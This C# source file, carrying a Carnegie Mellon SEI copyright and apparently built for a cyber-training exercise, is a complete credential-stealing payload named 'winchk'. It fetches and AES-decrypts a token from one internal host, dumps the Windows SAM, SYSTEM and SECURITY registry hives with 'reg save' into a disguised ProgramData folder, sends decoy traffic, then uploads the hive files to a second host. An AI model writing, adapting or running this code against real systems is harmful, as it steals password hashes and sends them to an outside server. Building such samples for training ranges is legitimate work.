/*
Copyright 2023 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;

namespace winchk
{
    public class Class1
    {
        public async Task Run()
        {
            try
            {
                WebClient webClient = new WebClient();
                string samtoken = webClient.DownloadString("http://10.5.5.219/reg/samtoken.txt");
                string iv = "Gh56tref89aQwv4u";
                string key = "jHrtUd0weG43qas9";
                samtoken = DecryptAESString(samtoken, key, iv);

                string url = "http://10.5.5.235/";

                Directory.CreateDirectory(@"C:\ProgramData\Microsoft\Temp");

                if (File.Exists(@"C:\ProgramData\Microsoft\Temp\sam" + samtoken))
                {
                    File.Delete(@"C:\ProgramData\Microsoft\Temp\sam" + samtoken);
                }

                if (File.Exists(@"C:\ProgramData\Microsoft\Temp\system" + samtoken))
                {
                    File.Delete(@"C:\ProgramData\Microsoft\Temp\system" + samtoken);
                }

                if (File.Exists(@"C:\ProgramData\Microsoft\Temp\security" + samtoken))
                {
                    File.Delete(@"C:\ProgramData\Microsoft\Temp\security" + samtoken);
                }

                Process.Start("reg", "save HKLM\\SAM C:\\ProgramData\\Microsoft\\Temp\\sam" + samtoken);
                Process.Start("reg", "save HKLM\\SYSTEM C:\\ProgramData\\Microsoft\\Temp\\system" + samtoken);
                Process.Start("reg", "save HKLM\\SECURITY C:\\ProgramData\\Microsoft\\Temp\\security" + samtoken);

                HttpClient client = new HttpClient();
                HttpContent content;

                for (int i = 0; i < 10; i++)
                {
                    content = new StringContent(Guid.NewGuid().ToString() + "-" + Guid.NewGuid().ToString() + "-" + Guid.NewGuid().ToString() +
                        "-" + Guid.NewGuid().ToString() + "-" + Guid.NewGuid().ToString());
                    await client.PostAsync(url, content);
                    Thread.Sleep(5000);
                }

                content = new ByteArrayContent(File.ReadAllBytes(@"C:\ProgramData\Microsoft\Temp\sam" + samtoken));
                await client.PostAsync(url, content);

                content = new ByteArrayContent(File.ReadAllBytes(@"C:\ProgramData\Microsoft\Temp\system" + samtoken));
                await client.PostAsync(url, content);

                content = new ByteArrayContent(File.ReadAllBytes(@"C:\ProgramData\Microsoft\Temp\security" + samtoken));
                await client.PostAsync(url, content);
            }
            catch (Exception exc)
            {
                Console.WriteLine(exc.StackTrace + Environment.NewLine + exc.Message);
            }
        }

        private string DecryptAESString(string encryptedText, string key, string iv)
        {
            string decryptedText = null;

            using (Aes aes = Aes.Create())
            {
                aes.Key = System.Text.Encoding.Default.GetBytes(key);
                aes.IV = System.Text.Encoding.Default.GetBytes(iv);

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream memoryStream = new MemoryStream(System.Convert.FromBase64String(encryptedText)))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            decryptedText = streamReader.ReadToEnd();
                        }
                    }
                }
            }

            return decryptedText;
        }
    }
}
